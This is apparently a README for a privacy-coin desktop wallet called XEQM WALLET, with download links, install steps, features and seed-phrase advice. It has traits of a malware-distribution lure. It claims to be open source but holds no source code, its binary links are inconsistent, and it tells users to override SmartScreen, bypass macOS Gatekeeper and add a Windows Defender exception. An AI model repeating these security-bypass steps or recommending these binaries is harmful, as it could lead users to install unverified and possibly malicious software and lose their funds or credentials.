# XEQM WALLET

**The official open-source, non-custodial desktop wallet for the XEQM privacy network — your keys, your node, your coins.**

Support & docs: [xeqmwallet.com/support](https://xeqmwallet.com/support) · [xeqmwallet.com/faq](https://xeqmwallet.com/faq)

---

## Download

<table align="left">
  <tr>
    <td align="center">
      <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe">
        <img src="https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows11&logoColor=white" alt="Download for Windows" />
      </a>
      <br />
      <sub>xeqmwallet-v2.1.0.exe · 84.2 MB</sub>
    </td>
    <td align="center">
      <a href="https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg">
        <img src="https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS" />
      </a>
      <br />
      <sub>xeqmwallet-v2.1.0.dmg · 79.8 MB</sub>
    </td>
    <td align="right">
      <a href="https://xeqmwallet.com/xeqmwallet-v2.1.0.zip">
        <img src="https://img.shields.io/badge/Download-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download for Linux" />
      </a>
      <br />
      <sub>xeqmwallet-v2.1.0.zip · 92.1 MB</sub>
    </td>
  </tr>
</table>

| Platform | File | Size | Requirements |
|---|---|---|---|
| Windows 10/11 (x64) | [`xeqmwallet-v2.1.0.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.1.0/xeqmwallet-v2.1.0.exe) | 84.2 MB | No extra dependencies |
| macOS (Apple Silicon & Intel) | [`xeqmwallet-v2.1.0.dmg`](https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg) | 79.8 MB | Universal binary |
| Linux (Debian, Ubuntu, Fedora, Arch) | [`xeqmwallet-v2.1.0.zip`](https://xeqmwallet.com/xeqmwallet-v2.1.0.zip) | 92.1 MB | Raw binaries, unzip and run |

The latest build and full release notes are always at [xeqmwallet.com/download](https://xeqmwallet.com/download). xeqmwallet.com is the only official source — no other domain or mirror distributes this wallet.

---

## Install

The wallet doesn't have a single cross-platform installer wizard — each OS gets its own native flow, but all three follow the same four-step shape shown on the [download page](https://xeqmwallet.com/download): **download → extract/launch → generate your seed → synchronize.** Here's what that looks like on each platform.

### Windows

1. **Download** [`xeqmwallet-v2.1.0.exe`](https://xeqmwallet.com/xeqmwallet-v2.1.0.exe).
2. **Run the installer.** Double-click the `.exe`. Windows SmartScreen will likely show an "unrecognized publisher" warning — this is normal for open-source software without a paid code-signing certificate. Click **More info → Run anyway** to continue the wizard.
3. **Follow the setup wizard** to completion, then **launch** XEQM WALLET.
4. The wallet stores its data under `%APPDATA%\XEQM`. If the daemon seems slow to start, add an exception for it in Windows Defender — privacy software is occasionally flagged heuristically.

### macOS (Apple Silicon & Intel)

1. **Download** [`xeqmwallet-v2.1.0.dmg`](https://xeqmwallet.com/xeqmwallet-v2.1.0.dmg).
2. **Open the `.dmg`** and drag **XEQM WALLET** into your Applications folder, as prompted.
3. **Launch it from Applications.** Because the build isn't Apple-notarized, Gatekeeper will refuse to open it on the first attempt — right-click the app icon, choose **Open**, and confirm the warning. From the next launch on, Gatekeeper remembers your approval.
4. Wallet data lives under `~/Library/Application Support/XEQM`.

### Linux

1. **Download** [`xeqmwallet-v2.1.0.zip`](https://xeqmwallet.com/xeqmwallet-v2.1.0.zip).
2. **Extract it** with `unzip` or your file manager. The raw binaries can be run in place or placed under `/usr/local/bin`.
3. **Mark the binary executable and run it:**
   ```bash
   chmod +x xeqmwallet
   ./xeqmwallet
   ```
   Debian, Ubuntu, Fedora, and Arch are all supported.

### First launch, on any platform

1. Choose **Create new wallet** (or **Restore from seed** if you already have one).
2. The wallet generates a 25-word recovery seed. **Write it down on paper — never a screenshot, never a cloud note, never typed into any website.**
3. Let the wallet **synchronize** with the blockchain, or connect to a remote node from Settings for instant readiness while your local copy syncs in the background.

Full walk-through, including what to do if the wallet won't connect or sync: [xeqmwallet.com/getting-started](https://xeqmwallet.com/getting-started) and [xeqmwallet.com/troubleshooting](https://xeqmwallet.com/troubleshooting).

---

## Features

- Send / receive with RingCT, stealth addresses, and Bulletproofs+ on every transaction — see [xeqmwallet.com/security](https://xeqmwallet.com/security)
- Ring signatures with decoy inputs — no transparent mode to accidentally enable
- Unlimited subaddresses from a single seed, grouped into named accounts
- View-only wallet mode for hot/cold setups
- Multi-wallet support — multiple seeds and view-only wallets open concurrently
- Encrypted, local-only address book
- Built-in `xeqmd` full node
- Remote-node mode for instant availability while the local daemon syncs
- Integrated solo-mining panel for RandomX
- Service-node staking initiated directly from the wallet — see [xeqmwallet.com/service-nodes](https://xeqmwallet.com/service-nodes)
- Wrap / unwrap to WXEQ for EVM-based DeFi access — see [xeqmwallet.com/wrap-stake](https://xeqmwallet.com/wrap-stake)
- `--proxy` flag for routing the daemon through Tor or a SOCKS5 VPN

Full feature breakdown: [xeqmwallet.com/features](https://xeqmwallet.com/features).

---

## Networks/Modes

| Mode | Description | Trade-off |
|---|---|---|
| **Local full node** | Wallet runs the bundled `xeqmd` daemon and verifies the entire ~48 GB chain itself | Strongest trust model; initial sync takes hours on SSD, longer on HDD |
| **Remote node** | Wallet connects to a community-operated node for instant availability | Faster to start; you're trusting that node's view of the chain until your local daemon catches up |

Switch between them anytime in **Settings**. Keys stay local either way.

---

## Where things live

| What | Windows | macOS | Linux |
|---|---|---|---|
| Wallet data / config | `%APPDATA%\XEQM` | `~/Library/Application Support/XEQM` | Not explicitly documented on [xeqmwallet.com](https://xeqmwallet.com/download) — check in-app under Settings |

---

## ⚠️ Seed phrase warning

**Your 25-word recovery seed is the only thing that controls your funds — write it on paper, never digitally, and never enter it anywhere but the wallet software itself.**

- XEQM Labs is **not** responsible for funds lost due to a mishandled, photographed, cloud-backed-up, or phished seed phrase — there is no admin override on a privacy chain by design.
- XEQM Labs **is** responsible for the software behaving as documented and disclosing known limitations honestly — see [xeqmwallet.com/security](https://xeqmwallet.com/security).
- No legitimate party — not a moderator, not "support," not any website — will ever ask you to type your seed phrase anywhere outside the wallet you installed. Anyone who does is attempting to steal your funds.
- Recommended: two physical paper copies, stored in two separate locations. There's no built-in cloud auto-backup for the seed, by design.

Full backup and recovery guidance: [xeqmwallet.com/faq](https://xeqmwallet.com/faq).

---

## Development

This repository holds reference documentation for XEQM WALLET, not the wallet application's own source code. Prerequisites, build commands, and the release process for the binary itself live wherever the wallet's own codebase is maintained — check [xeqmwallet.com/support](https://xeqmwallet.com/support) for the current pointer, since publishing build steps here would mean guessing at a codebase this repo doesn't contain.

---

## Support

- Docs & FAQ: [xeqmwallet.com/faq](https://xeqmwallet.com/faq)
- Troubleshooting: [xeqmwallet.com/troubleshooting](https://xeqmwallet.com/troubleshooting)
- Support page: [xeqmwallet.com/support](https://xeqmwallet.com/support)

---

## License

The documentation in this repository is MIT-licensed — see [LICENSE](LICENSE).
